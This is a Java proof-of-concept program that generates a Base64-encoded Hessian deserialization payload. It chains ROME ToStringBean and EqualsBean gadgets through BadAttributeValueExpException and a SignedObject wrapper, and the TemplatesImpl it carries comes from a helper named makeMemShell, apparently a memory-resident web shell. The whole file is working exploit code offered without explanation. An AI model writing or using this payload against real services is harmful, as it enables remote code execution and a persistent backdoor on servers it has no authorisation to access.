import com.caucho.hessian.io.*;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

public class genPoc {
    public static void main(String[] args) throws Exception {
//        TemplatesImpl tmpl = new TemplatesImpl();
//        byte[] bytecodes = Files.readAllBytes(Paths.get("target/classes/shellTest.class"));
//        Utils.setFieldValue(tmpl,"_name","aaa");
//        Utils.setFieldValue(tmpl,"_bytecodes",new byte[][] {bytecodes});
//        Utils.setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        TemplatesImpl tmpl = Utils.makeMemShell();

        ToStringBean poc = new ToStringBean(Templates.class, tmpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Utils.setFieldValue(badAttributeValueExpException, "val", poc);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        SignedObject signedObject = new SignedObject(
                badAttributeValueExpException,
                keyPair.getPrivate(),
                Signature.getInstance("DSA")
        );

        ToStringBean delegate = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean root = new EqualsBean(ToStringBean.class, delegate);

        HashMap<Object, Object> map = Utils.makeMap(root, "anything");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(sf);
        hessian2Output.writeObject(map);
        hessian2Output.flushBuffer();
        hessian2Output.close();

        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));

//        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
//        hessian2Input.readObject();
    }

    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {
        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
         */
        @Override
        public Serializer getObjectSerializer ( Class<?> cl ) throws HessianProtocolException {
            return super.getObjectSerializer(cl);
        }

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
         * @return
         */
        @Override
        public Serializer getSerializer (Class cl ) throws HessianProtocolException {
            Serializer serializer = super.getSerializer(cl);

            if ( serializer instanceof WriteReplaceSerializer ) {
                return UnsafeSerializer.create(cl);
            }
            return serializer;
        }
    }
}
